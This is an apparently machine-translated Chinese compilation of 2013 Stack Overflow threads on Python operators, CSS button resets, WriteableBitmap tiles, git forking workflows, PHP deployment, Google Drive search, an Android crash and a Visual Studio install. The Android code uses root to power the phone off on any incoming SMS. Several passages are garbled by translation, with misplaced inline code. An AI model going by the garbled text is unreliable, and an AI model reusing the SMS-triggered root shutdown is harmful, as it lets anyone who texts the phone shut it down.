我在 Windows 上遇到了 Python 2.7.3-32bits 的问题。我放了这段代码，看看是否有人可以帮助我解决这个错误。注释是西班牙语，但不影响代码。

```
 import gtk
 import numpy
 import math
 import os

 #Pedimos el nombre de la imagen de origen
 nombreFich = input("Por favor, introduzca el nombre de la imagen de origen:")

 #Validar que existe el fichero
 imagen1 = gtk.Image()
 imagen1.set_from_file('C:\\Users\\xxx\\Desktop\\xxxx.png')
 pb1 = imagen1.get_pixbuf()
 pm1 = pb1.get_pixels_array()

 #Hacemos una copia de la imagen
 pm2 = pm1.copy()

 #Validamos los puntos de distorsion hasta que sean validos
 puntos = " "
 arrayPuntos = " "
 while(puntos == " " and len(arrayPuntos) < 4):
     print"Por favor, introduzca los puntos de distorsión xc yc r e:"
     puntos= raw_input()
     arrayPuntos = puntos.split(" ")

 #Sacamos los puntos separando la cadena por el caracter espacio
 xc =(puntos[0])
 yc =(puntos[1])
 r =(puntos[2])
 e =(puntos[3])

 #función que calcula el grado de distorsión
 def grado(self,z,e): 
     if(z>1):
         return 1
     elif(e<0):
         return (1/z)**(-e/(1-e))
     else:
        return z**e

 #Distorsionamos la imagen
 def distors(xc,yc,r,e,x,y):
     d = math.sqrt(x**2+y**2)#Sacamos la distancia
     z = d/r
     if(z!=0):
         g=grado(z,e)
         xm=x*g
         ym=y*g
         return xm,ym

     else:
         xm=x
         ym=y
         return xm,ym
 def recorrido (pm1, xc, yc, r, e):
     pm2 = pm1.copy()

     x= str(--r)
     y= str(--r)
     while (y <= r):                     
         while (x <= r):
             xm, ym = mover(xc, yc, r, e, x, y)
             pm2[yc+y][xc+x] = pm1[yc+ym][xc+xm]
             x = x+1
         y= y+1
         x= -r

     return pm2
 pm2 = recorrido(pm1, xc, yc, r, e)

 #Guardamos los cambios
 pb2 = gtk.gdk.pixbuf_new_from_array(pm2,pb1.get_colorspace(),pb1.get_bits_per_sample())
 nomfich2 = nombreFich+"_copia"
 ext = os.path.splitext("C:\\Users\xxx\Desktop\xxxx.png_copia")[1][1:].lower()
 pb2.save("C:\\Users\xxx\Desktop\xxxx.png_copia",ext)
 print"FINISH" 
```

当我运行 python 代码时，出现以下错误：

```
 Traceback (most recent call last):
   File "F:\Dropbox\Práctica Pitón\Práctica3.0.py", line 71, in <module>
     pm2 = recorrido(pm1, xc, yc, r, e)
   File "F:\Dropbox\Práctica Pitón\Práctica3.0.py", line 59, in recorrido
     x= str(--r)
 TypeError: bad operand type for unary -: 'str' 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-05T23:41:36.703

错误消息告诉您这`r`是一个字符串。你不能否定一个字符串。

为什么是字符串？好吧，它似乎来自这里：

```
# ...
puntos= raw_input()
arrayPuntos = puntos.split(" ")
# ...
r =(puntos[2]) 
```

字符串上的`split`方法返回字符串列表。

那么，你如何解决这个问题？好吧，如果`r`是，比如说，字符串“22”，那么`float(r)`就是浮点数`22.0`，并且`int(r)`是整数`22`。其中之一可能就是您想要的。

一旦你添加了，比如说，`r=int(r)`你`--r`将不再是一个例外。

* * *

但这可能不是你想要的。在 Python 中，`--r`just 表示对的否定的否定`r`——换句话说，它与 相同`-(-(r))`，即只是`r`。您可能正在寻找 C 前缀运算符的等效项`--`，它减少变量并返回新值。Python 中没有这样的运算符；事实上，不存在修改变量然后返回值的运算符。

这是一个更大问题的一部分。Python 旨在使语句和表达式尽可能不同，以避免混淆。C 旨在使尽可能多的东西表达，以节省打字。因此，您通常不能只逐行将一个翻译成另一个。

在这种情况下，您必须分两步完成，如 Thanasis Petsas 所示：

```
r -= 1
x = str(r) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-05T23:33:55.657

python 不支持递增`++`和递减运算符。`--`你可以改用这个：

```
r -= 1
x = str(r) 
```

# css - CSS & Button：如何覆盖 html 按钮元素的原生 CSS？

> ID：15845243
> 
> 赞同：5
> 
> 时间：2013-04-05T23:32:33.793
> 
> 标签：css, button, user-agent

我尝试将我发现的优雅的 CSS 样式应用于按钮。出于语义/可访问性的原因，我需要保留按钮。但是我漂亮的 CSS 与按钮元素的原生 CSS 样式相冲突，并且输给了它。

**如何覆盖html按钮元素的自然CSS？**

```
/* CSS works for buttonis, doesn't work for buttons*/
button.btn, buttoni.btn {  
   ... 
} 
```

[http://jsfiddle.net/bkWNw/3/](http://jsfiddle.net/bkWNw/3/)

**编辑：**按钮元素应该看起来与 buttonis 元素完全一样。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-05T23:37:55.717

要么使用[CSS 重置](http://meyerweb.com/eric/tools/css/reset/)，要么将边框和轮廓设置为`none`.

```
border: none;
outline: none; 
```

[http://jsfiddle.net/bkWNw/5/](http://jsfiddle.net/bkWNw/5/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T00:01:52.827

在最新的浏览器上，您还可以`-webkit-appearance: none` `-moz-appearance: none`用来从这些元素中删除默认样式。演示：http: [//jsfiddle.net/faueK/](http://jsfiddle.net/faueK/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T23:38:04.883

只是设置`border: none`摆脱那个边界。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-08-15T10:03:06.963

## 这是一个完整的 CSS 重置：

### 在 CSS 中

```
.reset-style {
  padding: 0;
  border: none;
  font: inherit;
  color: inherit;
  background-color: transparent;
  cursor: pointer;
  }
```

```
<button class="reset-style">This is clickable</button>
```

### 在 JS 中：

```
 export const resetButton = {
    padding: 0,
    border: 'none',
    font: 'inherit',
    color: 'inherit',
    backgroundColor: 'transparent',
    cursor: 'pointer'
} 
```

# c# - 从以编程方式创建的可写位图中设置辅助平铺图像

> ID：15845246
> 
> 赞同：1
> 
> 时间：2013-04-05T23:33:06.467
> 
> 标签：c#, windows-8, live-tile

我拼命尝试将可写位图设置为辅助图块图像的来源。我想我快到了，但它拒绝工作。谁能看到我错过了什么？我会很感激！

我正在使用以下方法创建位图：

```
var bitmap = new WriteableBitmap(150, 150);
            Stream stream = bitmap.PixelBuffer.AsStream();
            stream.Seek(0, SeekOrigin.Begin);

            var pixels = new byte[stream.Length];
            for (int i = 0; i < pixels.Length; i += 4)
            {
                pixels[i] = 255;
                pixels[i + 1] = 0;
                pixels[i + 2] = 189;
                pixels[i + 3] = 9;
            }

            stream.Write(pixels, 0, pixels.Length);
            bitmap.Invalidate(); 
```

图像通过以下方式保存到计算机：

```
await WriteableBitmapSaveExtensions.SaveToFile(bitmap, ApplicationData.Current.LocalFolder,"image.png", CreationCollisionOption.ReplaceExisting); 
```

该图像可以在目录中找到：

```
C:\Users\<USER>\AppData\Local\Packages\<PKGID>\LocalState 
```

我正在使用这种方法创建辅助磁贴：

```
CreateSecondaryTileFromWebImage("image.png", "tildId","shortName","displayName","arguments", MainPage.GetElementRect((FrameworkElement)sender));

public async Task CreateSecondaryTileFromWebImage(string bitmapName, string tileId, string shortName, string displayName, string arguments, Rect selection)
    {
        //Create uri
        var bitmap = new Uri(string.Format("ms-appdata:///local/{0}", bitmapName));

        //Create tile
        SecondaryTile secondaryTile = new SecondaryTile(tileId, shortName, displayName, arguments, TileOptions.ShowNameOnLogo, bitmap);

        //Confirm creation
        await secondaryTile.RequestCreateForSelectionAsync(selection, Windows.UI.Popups.Placement.Above);
    } 
```

磁贴已创建并固定到开始屏幕，但图像是 100% 透明的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T13:29:22.213

更正代码后，它在此处提到的目录中生成了一个有效的 .png 文件：C:\Users\\AppData\Local\Packages\\LocalState

事实证明，这是我如何编写 WriteableBitmap 像素的一个简单问题。虽然 WriteableBitmap 数据流格式是 ARGB，但字节需要倒写。在我的问题中，我**实际上**将每个像素分配给：BGRA = 255,0,189,9

透明度字节设置为 9，使图像接近 100% 透明，并给出未正确加载的外观。

因此，为了获得我想要的颜色，我需要编写：

```
var pixels = new byte[stream.Length];
        for (int i = 0; i < pixels.Length; i += 4)
        {
            pixels[i] = 9;
            pixels[i + 1] = 189;
            pixels[i + 2] = 0;
            pixels[i + 3] = 255;
        } 
```

# git - git多个项目合并

> ID：15845249
> 
> 赞同：5
> 
> 时间：2013-04-05T23:33:28.403
> 
> 标签：git, merge

我们会将一个项目分叉到它自己的代码库中，但它会密切关注它所分叉的项目。

我看到它是这样工作的：

分叉项目将开发一些初始更改以重新命名产品。我不想与原始项目共享这些更改，但我想合并更改。

我们设置它的方式是现在具有相同历史记录的单独存储库，只需为彼此添加遥控器。

我想到的工作流程是这样的：

我们应该尝试在功能分支上工作，并且每个功能只有 1 次提交，这样我们每个人都可以 git cherry-pick 。每当您处理某个功能并提交时，只需在该功能的分支中执行 git commit --amend 即可。当它最终确定时，我可以挑选提交。

我不喜欢这样，因为如果在挑选樱桃后特性发生变化，开发人员需要记住不是结束而是创建一个新的提交。

我很想通过合并或变基来做到这一点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T04:35:04.213

一种可能的构建方式是使用三个存储库，其中一个存储库是“白标版本”，另外两个存储库用于两个前端。两个前端将引用“白标版本”存储库作为子模块。

使用这种结构，您：

1.  已明确将白标版本称为“受控”的共享资源，但其他版本
2.  然而，仍然允许两个前端更改白标版本
3.  允许两个前端使用它们的存储库内容独立开发。

如果您的两个前端将相似，那么它们可以是一个存储库的分支（但都依赖于子模块）。在这种情况下，如果您在两个前端之间来回合并，一个好的方法是为每个特征创建一个分支。每个功能都有一个分支可以让您摆脱“每个分支一次提交”的限制。`<branch-base>..<branch-head>`[编辑] 根据特性分支的性质，您可以 a) 使用;挑选所有提交 或 b) 将分支上的所有内容重新设置为一个提交，然后选择该提交或 c) 使用合并/重新设置将功能分支到另一个分支（请参阅`git rebase`文档中的众多示例，尤其是`--onto`选项。） [/编辑]

[这里](http://nvie.com/posts/a-successful-git-branching-model/)还有一个常见的、备受推崇的分支模型，其中讨论了特性分支。

[edit2] 如果您愿意，您可以使用一个存储库来执行此操作。保留三个主要分支：white-label-dev、prod1-dev、prod2-dev，并让三个团队中的每个团队的开发人员只在他们的分支上操作，或者在他们的分支之外创建的分支上操作。当一个团队有一些应该共享的东西时，“企业集成负责人”将负责将提交从一个团队的工作转移到另一个团队的分支。（如上所述移动提交。）

您的团队将需要一些纪律，以避免与另一个团队的分支机构发生冲突。但是，如果您有一个共享存储库，您可以分配挂钩以防止来自错误团队的推送到另一个团队的分支。[/编辑2]

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T14:32:22.010

建议的工作流程：

*   每个功能的新分支
*   开发人员通常提交到功能分支
*   合并到主分支时：

`git merge --squash -m 'new feature' branchname`

现在，删除分支！

`git branch -D branchname`

*   如果开发人员需要修复某些东西或更改功能，他会从 master 创建一个新分支。其他一切都是一样的。

下一次合并将在主分支上显示为不同的提交。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-11T18:45:24.287

我认为您希望遵循 Github 用于保持分叉项目更新的类似程序。

首先是`whitelabel`回购。这是其他项目将分叉的项目。然后其他项目将是设置为repo`whitelabel`的克隆。使用它，您将能够执行或取决于工作流程。`whitelabel``upstream``git merge upstream/master``git rebase upstream/master`

优点是您不必直接了解主要项目的状态。其他项目成为他们自己的分支，可以轻松更新。尝试`cherry-pick`更改可能很容易变得繁重，尤其是在提交很多的情况下。如果其他项目之一想要对来自原始存储库的代码进行更改，则执行此操作，您可以更轻松地管理该更改。

[http://www.techblogistech.com/2012/07/setting-a-default-upstream-branch-in-git/](http://www.techblogistech.com/2012/07/setting-a-default-upstream-branch-in-git/)

请参阅此处有关拉入更改的部分： [https ://help.github.com/articles/fork-a-repo](https://help.github.com/articles/fork-a-repo)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-06T00:47:41.067

如果叉子应该跟随叉子的脚步，最好将叉子保存在主存储库的分支中。否则，挑选上游变化等将变得不必要地困难。

考虑分叉存储库的好处/成本。保持在一起只是意味着拖着差异（可能很小？）。

如果需要，您可以使用[gitolite](https://github.com/sitaramc/gitolite)控制对分支的访问。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-10T02:07:49.850

假设您的品牌代码都可以“干净”地驻留在*views/*目录中，我建议将*视图*拆分为自己的 git 存储库并将其嵌套在您的主项目中。看[这里](https://stackoverflow.com/questions/359424/detach-subdirectory-into-separate-git-repository)

然后，您可以选择

1.  在单个*视图*存储库中为您的分叉使用 git 分支，或者
2.  为每个品牌使用单独的*视图存储库。*

我更喜欢 1\. 因为我预计部分视图可能需要通过将它们折叠回*白标或从**白标*中挑选到品牌上来共享。

* * *

## 可能的项目工作布局

白标项目布局；

```
- app_whitelabel/  <<-- clone of "app" repo on default branch
  + config/
  + controllers/
  + errors/
  + views/         <<-- nested clone of "views" repo on branch "brand1" 
```

品牌1项目布局；

```
- app_brand1/     <<-- clone of "app" repo on default branch
  + config/
  + controllers/
  + errors/
  + views/         <<-- nested clone of "views" repo on branch "brand1" 
```

品牌 [n] 项目布局；

```
- app_brand2/      <<-- clone of "app" repo on default branch
  + config/
  + controllers/
  + errors/
  + views/         <<-- nested clone of "views" repo on branch "brand[n]" 
```

* * *

## 优点

*   您无需精心挑选即可使共享代码库保持最新状态 - 只需拉取即可。
*   “应用程序”的拉动不会影响“视图”。
*   强迫你保持一个干净的 mvc 模型 - 这不是一件坏事:)

## 缺点

*   您/其他人需要了解更复杂的项目布局。
*   强迫你保持一个干净的 mvc 模型 - 并不总是一件容易的事:)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-13T09:58:53.870

假设您可以控制两个存储库，则解决方案很简单。

维护每个功能的分支。

维护一个功能发布分支。

功能完成后，将功能分支合并到发布分支并标记它。

如果该功能需要修复错误，请在功能分支中修复它，然后重新合并并使用新版本重新标记它。

您的功能发布分支是您可以集中挑选更新功能或错误修复的地方。您可以通过标签轻松识别您拥有的功能版本。

您还可以轻松查看功能发布分支上的提交历史记录，以查看是否有任何更新。

除了这些分支之外，我还维护一个版本发布分支。任何公开发布的内容都是 QAd 然后提交到版本发布分支。

每个人的本地工作存储库都可以不受限制地拥有他们想要或需要的任意数量的提交。

主存储库具有明确划分的分支，具有明确分段的提交，这些提交不断合并到功能发布和版本发布中。

任何分支都可以通过遵循功能发布分支或版本发布分支轻松更新。在他们想要的任何时候，分叉的回购都可以抓住合适的东西。

![我画了一张粗略的图](https://i.stack.imgur.com/1eQFr.png)

黄色分支是标记的功能发布分支，绿色是版本发布分支。叉子可以自由地从其中任何一个分支中拉出，并且确切地知道他们用樱桃镐得到了什么。工作特性分支都基于发布分支，除非它们相互依赖。错误修复与发布分开处理。

就像我说的那样……所有开发人员都有自己的工作存储库，并且可以自由地提交这些存储库。

# php - 如何一次将 Web 应用程序部署组织到多台服务器上？

> ID：15845259
> 
> 赞同：0
> 
> 时间：2013-04-05T23:34:42.460
> 
> 标签：php, deployment

所以 - 假设我开发了一个 PHP 应用程序，我在一个与生产环境相同的 vagrant box 中开发它。所以 - 作为最终结果，我将拥有一个带有代码的 *.tar.zip 文件......

如何将部署组织到有大量应用程序服务器的生产环境中？我的意思是-我很困惑如何一次将代码同步推送到生产中？

**更多信息：**

服务器上的代码存储如下：

```
project
  +current_revision ->link to revisions/v[n]
  +revisions
    +v1
    +v2
    +v3
    ...
  +data 
```

因此，当我必须部署更改时，我通常会运行一个部署脚本，该脚本使用 ssh 将更新的 tar 上传到服务器上，解压缩到特定目录下的修订版，将其符号链接到 current_revision 并重新启动 php-fpm .... 这样我就可以随时回滚符号链接到旧版本。

对于多台服务器，困扰我的是并非所有盒子都会立即更新，即。从技术上讲，可能会出现一些故障。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T23:54:28.220

如果您正在寻找“准备就绪”的答案，则需要提供有关您的设置的更多信息。例如，如果您计划将 git 用于 VCS，您可以编写一个简单的 shell 脚本来拉取最新的提交和`rsync`服务器。或者，如果你在 Symfony 之上构建，[capifony](http://capifony.org)是一个很棒的工具。如果您使用 AWS，有一个由 Vagrant 的作者编写的[提供程序插件](https://github.com/mitchellh/vagrant-aws)，非常易于使用，您可以指定要带哪些机器的正则表达式`up`或`provision`.

相反，如果您正在寻找更多的“路线图”，那么您需要考虑的因素是：

1.  尽可能轻松地在远程和本地环境中构建相同的盒子，并尝试确保您的配置强调[幂等](http://en.wikipedia.org/wiki/Idempotence)性。
2.  考虑您的版本控制/发布结构；哪些资源很少或永远不会改变？将它们包含在`setup`函数而不是`deploy`函数中，并且不要将它们包含在同步运行中。
3.  将您的开发和系统管理问题分开；即不要只是用 *.tar.gz 打包一个 vagrant box 并通过 .tar.gz 绑定它`config.vm.box_url`。这样做的原因是，每次部署时，您都必须用新的盒子重新打包每个生产服务器，而不是仅仅更改服务器上的文件，或者从服务器中添加/删除一些包。
4.  查看一些配置管理工具，例如[Chef](http://www.opscode.com/chef/)和[Puppet](https://puppetlabs.com/solutions/configuration-management/)；即使您最终没有使用它们，它们也会让您了解系统管理员专业人员如何解决此问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T23:37:27.770

很多方法。如果从准系统（没有云基础设施）开始，我是 SVN 分支钩子的粉丝。为您的代码创建一个 SVN 存储库。在它上面设置一个 post-commit 钩子，它检查 /branch/production/ 中的任何内容是否已更改。

如果有，请让 post-commit 挂钩触发所有自动推出过程 - 在这种情况下，一个简单的方法是让`svn export`分支知道*您的所有服务器。就如此容易！

（*这是艰难的一步）

# google-drive-api - 如何使用 drive#property 键/值进行搜索？

> ID：15845263
> 
> 赞同：3
> 
> 时间：2013-04-05T23:35:18.847
> 
> 标签：google-drive-api

我正在研究 Google Drive 是否适合我们为我们正在构建的 Web 应用程序托管资源库。我想知道新的（？）文件属性是否可以通过编程方式搜索 - 在此处的搜索部分中没有看到任何示例：[https](https://developers.google.com/drive/search-parameters) ://developers.google.com/drive/search-parameters 。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-07T16:48:44.307

它们不可搜索，但是，抱歉。此功能即将推出。谷歌同意这将是一个很棒的和必需的功能，以使新的属性功能完全有效.vg

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-08-31T15:16:24.607

我知道这是超级旧的，但如果有人遇到这个，Google Drive 现在确实支持搜索文件的属性和 appProperties。见[这里](https://developers.google.com/drive/v3/web/search-parameters)。

# android - 我的应用程序不断崩溃

> ID：15845267
> 
> 赞同：0
> 
> 时间：2013-04-05T23:35:36.413
> 
> 标签：android, eclipse, adt

我在eclipse中制作了一个应用程序，每次我想打开它时它都会崩溃。该应用程序应该能够在收到特定措辞的短信时关闭手机。它确实需要root权限。也是方式我正在运行它是通过按下 Eclipse 上的运行按钮，它表明我在编码中没有错误，所以你可以看到我很迷茫。

这是日志文件：

```
04-05 23:19:31.638: E/Trace(962): error opening trace file: No such file or directory (2)
04-05 23:19:32.294: D/AndroidRuntime(962): Shutting down VM
04-05 23:19:32.354: W/dalvikvm(962): threadid=1: thread exiting with uncaught exception (group=0x40a71930)
04-05 23:19:32.459: E/AndroidRuntime(962): FATAL EXCEPTION: main
04-05 23:19:32.459: E/AndroidRuntime(962): java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{com.rabazid.abzsmspoweroff/com.rabazid.abzsmspoweroff.SmsLoggerActivity}: java.lang.ClassNotFoundException: Didn't find class "com.rabazid.abzsmspoweroff.SmsLoggerActivity" on path: /data/app/com.rabazid.abzsmspoweroff-1.apk
04-05 23:19:32.459: E/AndroidRuntime(962):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2106)
04-05 23:19:32.459: E/AndroidRuntime(962):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2230)
04-05 23:19:32.459: E/AndroidRuntime(962):  at android.app.ActivityThread.access$600(ActivityThread.java:141)
04-05 23:19:32.459: E/AndroidRuntime(962):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1234)
04-05 23:19:32.459: E/AndroidRuntime(962):  at android.os.Handler.dispatchMessage(Handler.java:99)
04-05 23:19:32.459: E/AndroidRuntime(962):  at android.os.Looper.loop(Looper.java:137)
04-05 23:19:32.459: E/AndroidRuntime(962):  at android.app.ActivityThread.main(ActivityThread.java:5041)
04-05 23:19:32.459: E/AndroidRuntime(962):  at java.lang.reflect.Method.invokeNative(Native Method)
04-05 23:19:32.459: E/AndroidRuntime(962):  at java.lang.reflect.Method.invoke(Method.java:511)
04-05 23:19:32.459: E/AndroidRuntime(962):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
04-05 23:19:32.459: E/AndroidRuntime(962):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
04-05 23:19:32.459: E/AndroidRuntime(962):  at dalvik.system.NativeStart.main(Native Method)
04-05 23:19:32.459: E/AndroidRuntime(962): Caused by: java.lang.ClassNotFoundException: Didn't find class "com.rabazid.abzsmspoweroff.SmsLoggerActivity" on path: /data/app/com.rabazid.abzsmspoweroff-1.apk
04-05 23:19:32.459: E/AndroidRuntime(962):  at dalvik.system.BaseDexClassLoader.findClass(BaseDexClassLoader.java:65)
04-05 23:19:32.459: E/AndroidRuntime(962):  at java.lang.ClassLoader.loadClass(ClassLoader.java:501)
04-05 23:19:32.459: E/AndroidRuntime(962):  at java.lang.ClassLoader.loadClass(ClassLoader.java:461)
04-05 23:19:32.459: E/AndroidRuntime(962):  at android.app.Instrumentation.newActivity(Instrumentation.java:1054)
04-05 23:19:32.459: E/AndroidRuntime(962):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2097)
04-05 23:19:32.459: E/AndroidRuntime(962):  ... 11 more
04-05 23:22:33.095: I/Process(962): Sending signal. PID: 962 SIG: 9 
```

这是Android清单：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.rabazid.abzsmspoweroff"
android:versionCode="1"
android:versionName="1.0" xmlns:tools="http://schemas.android.com/tools">
<uses-sdk android:minSdkVersion="4" tools:ignore="UsesMinSdkAttributes"/>
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
<application android:icon="@drawable/ic_launcher" android:label="@string/app_name" tools:ignore="AllowBackup">
    <activity
        android:name=".SmsLoggerActivity"
        android:label="@string/app_name">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
    <receiver android:name=".Broadcastreceiver">
        <intent-filter android:priority="2147483647">
            <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            <action android:name="android.intent.action.BOOT_COMPLETED" />
        </intent-filter>
    </receiver>
    <activity android:name=".PreferenceConnector">
        <intent-filter>
            <action android:name="android.intent.action.RUN" />
            <category android:name="android.intent.category.DEFAULT" />
        </intent-filter>
    </activity>
</application>
</manifest> 
```

这是 SMSReceiver.java：

```
package com.rabazid.abzsmspoweroff;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SMSReceiver extends BroadcastReceiver {

private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

@Override
public void onReceive(Context context, Intent intent) {
    if (intent.getAction().equals(SMS_RECEIVED)) {
        Bundle bundle = intent.getExtras();
        try {
            Process proc = Runtime.getRuntime()
                            .exec(new String[]{ "su", "-c", "reboot -p" });
            proc.waitFor();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        if (bundle != null) {
            // get sms objects
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus.length == 0) {
                return;
            }
            // large message might be broken into many
            SmsMessage[] messages = new SmsMessage[pdus.length];
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < pdus.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                sb.append(messages[i].getMessageBody());
            }
            String message = sb.toString();
            Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
            // prevent any other broadcast receivers from receiving broadcast
            // abortBroadcast();
        }
    }
}
} 
```

这是布局文件夹中的 main.xml 文件：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:id="@id/group"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:orientation="vertical" >

<TextView
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="@string/oldpasswordtext" />

<EditText
    android:id="@id/oldpasswordfield"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:inputType="textPassword"
    android:singleLine="true" />

<TextView
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="@string/enterpasswordtext" />

<EditText
    android:id="@id/newpasswordfield1"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:inputType="textPassword"
    android:singleLine="true" />

<TextView
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="@string/confirmpasswordtext" />

<EditText
    android:id="@id/newpasswordfield2"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:inputType="textPassword"
    android:singleLine="true" />

<Button
    android:id="@id/add"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:onClick="onClick"
    android:text="@string/changebtntext" />

<TextView
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:gravity="center"
    android:text="@string/about"
    android:textColor="@color/blue"
    android:textStyle="bold"
    tools:ignore="ObsoleteLayoutParam" /> 
```

这是布局文件夹中的 activity_broadcastreceiver.xml 文件：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout android:layout_width="fill_parent" android:layout_height="fill_parent"
  xmlns:android="http://schemas.android.com/apk/res/android"      xmlns:tools="http://schemas.android.com/tools">
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content"        tools:context=".Broadcastreceiver" />
</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T23:44:46.007

```
java.lang.ClassNotFoundException: Didn't find class "com.rabazid.abzsmspoweroff.SmsLoggerActivity" 
```

您缺少我假设的类定义。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T23:47:13.080

**这很可能是构建问题**

如果您正在使用构建机器构建此代码，那么代码很可能在构建过程中被排除在外。

如果您没有使用构建机器..那么您可以尝试的一件事是删除 bin/gen 目录并重新生成所有文件。如果您查看 bin 目录并遵循 com.rabazid.abzsmspoweroff.SmsLoggerActivity 路径，那么您将看到它是否包含在您的 apk 中。bin 目录中的所有内容都是应用于最终二进制文件的内容。另外要检查的另一件事是您的proguard规则。

如果一切正常，那么您应该在其各自的路径中看到 com.rabazid.abzsmspoweroff.SmsLoggerActivity。

# c++ - 全新安装 VS 2012 不会构建默认控制台应用程序：缺少 SDKDDKVer.h（和 stdio.h / CRT）

> ID：15845269
> 
> 赞同：2
> 
> 时间：2013-04-05T23:36:09.290
> 
> 标签：c++, visual-c++, visual-studio-2012

我在我的 Windows 7 64 位机器上使用了 VS 2012 Professional 的试用版大约 1 个月。

今天，我注意到`Platform Toolset`选项（项目属性）设置为`Visual Studio 2010 (v100)`，这似乎很奇怪，因为我正在运行 VS 2012。将“平台工具集”更改为 VS 2012 导致此问题标题中指出的错误：

> 无法打开包含文件：“SDKDDKVer.h”：没有这样的文件或目录

...在构建时`stdafx.cpp`（错误本身发生在文件中`targetver.h`）。

我之前浏览的论坛讨论暗示在 VS 2012 安装期间存在 VS 2010 可能会导致问题。（我没有指向当前手头的那些帖子的链接。）

因为我最近购买了 VS 2012 Professional，所以我卸载了 VS 2012 的试用版，然后从 MSDN 网站重新下载了一个付费版 VS 2012（Professional）。总而言之，卸载/重新安装需要 2 个小时左右。

在重新安装 VS 2012 期间，我非常注意所有可能的选项，看看是否有任何选项可能导致 VS 2012 安装程序“跳过”VS 2012 头文件或其他 VS 2012 组件，并使用 VS 2010 组件反而。我找不到这样的选择。

重新安装 VS 2012 成功。

我在新的工作区中创建了一个新的控制台项目（请注意，尽管卸载/重新安装，我的“最近的项目列表”仍然显示我最近的 VS 2012 项目）。新控制台项目的项目设置显示正在使用正确的工具集 - `Platform Toolset`= `Visual Studio 2012 (v110)`。

不幸的是，构建开箱即用的 VS 2012 控制台应用程序（包括预编译头选项，但在创建项目向导中没有其他选项）会导致完全相同的错误：

> 无法打开包含文件：“SDKDDKVer.h”：没有这样的文件或目录

我应该怎么办？

.

**附录：**给未来读者的注意事项；更改路径设置后（请参阅下面答案下方的注释）以便 VS 2012 找到 SDKDDKVer.h，但它仍然无法找到 stdio.h，这是一个更严重的问题，因为 VC11 版本的 stdio.h（以及所有 VC11 CRT headers）在任何地方的机器上都不可用。

不幸的是，微软在他们的 VS 2012 安装过程中仍然没有解决这些主要错误。我发现获得包括所有 VC11 CRT 文件的有效 VS 2012 安装的**唯一方法是：**

*   彻底清除您的系统中的所有 MS 产品（这可能有点矫枉过正，但除了卸载 VS 2012 之外，我**还**必须至少卸载 VS 2010）
*   删除以下答案的评论中提到的注册表项（为了安全起见）
*   删除残留目录（为了安全起见）
*   重启（为了安全起见）
*   从头开始安装 VS 2012 从**.ISO，而不是安装程序**（假设安装文件是从 MSDN 站点下载的）（使用像 Power2Go 这样的程序来安装 .iso）
*   然后，请务必安装 VS 2012 Service Pack 1（通过“Windows Update”控制面板）（不执行此步骤，VC11 CRT 头文件仍然没有安装在机器上的任何位置）
*   最后，按照 [此链接] 中的描述映射 Windows SDK 库目录（链接现在指向诈骗站点，已删除）（如果不执行后面的步骤，链接器将无法找到 Windows 内核库的路径）

...然后有一个 VS 2012 的工作安装。

非常感谢，微软。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-12-03T14:10:19.710

